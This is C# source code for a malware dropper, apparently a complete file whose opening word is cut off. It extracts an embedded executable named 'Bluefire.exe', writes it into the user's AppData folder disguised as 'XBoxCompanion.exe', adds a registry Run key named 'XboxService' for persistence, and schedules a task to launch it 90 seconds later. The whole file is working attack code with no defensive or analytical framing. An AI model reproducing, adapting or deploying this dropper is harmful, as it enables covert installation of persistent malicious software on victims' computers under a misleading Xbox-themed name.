ing Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace Dropper
{
    class Program
    {
        static void Main(string[] args)
        {
            String path = findSuitableLocation();
            dropBinary(path);
            installRegStart(path);
            startExecution(path);
        }


        private static string findSuitableLocation()
        {
            String username = Environment.UserName;
            String path1 = "C:\\Users\\";
            String path2 = "\\AppData\\Roaming\\Microsoft\\XBox\\";
            String fileName = "XBoxCompanion.exe";
            Directory.CreateDirectory(path1 + username + path2);
            if (File.Exists(path1 + username + path2 + fileName))
            {
                Console.WriteLine("Deleting file");
                File.Delete(path1 + username + path2 + fileName);
            }
            return (path1 + username + path2 + fileName);
        }

        private static void dropBinary(String location)
        {
            Stream file = Assembly.GetExecutingAssembly().GetManifestResourceStream("Dropper.Bluefire.exe");
            byte[] filedata = new byte[file.Length];
            file.Read(filedata, 0, (int)file.Length);
            File.WriteAllBytes(@location, filedata);
            file.Flush();
            file.Close();
        }
        private static void installRegStart(string path)
        {
            //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("XboxService", path);
            key.Close();
        }


        //TODO: fix launch on battery: schtasks.exe has no option to disable the limitation that prevents starting
        //when not on battery.  To fix, turn this schtasks.exe command into an xml file and use that to create the
        //scheduled task.
        private static void startExecution(string path)
        {
            // schtasks /create /sc once /TN "XBoxService" /TR "C:\Windows\System32\notepad.exe" /ST 11:56
            DateTime schtasktime = DateTime.Now;
            Console.WriteLine(DateTime.Now);
            schtasktime = schtasktime.AddSeconds(90);
            string timestr = schtasktime.ToString("HH:mm:ss");

            using (Process process = new Process())
            {

                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = " /create /sc once /TN \"XBoxService\" /TR \"" + path + "\" /ST " + timestr;
                Console.WriteLine(process.StartInfo.Arguments);
                process.Start();
                process.WaitForExit();

            }

        }
    }
}
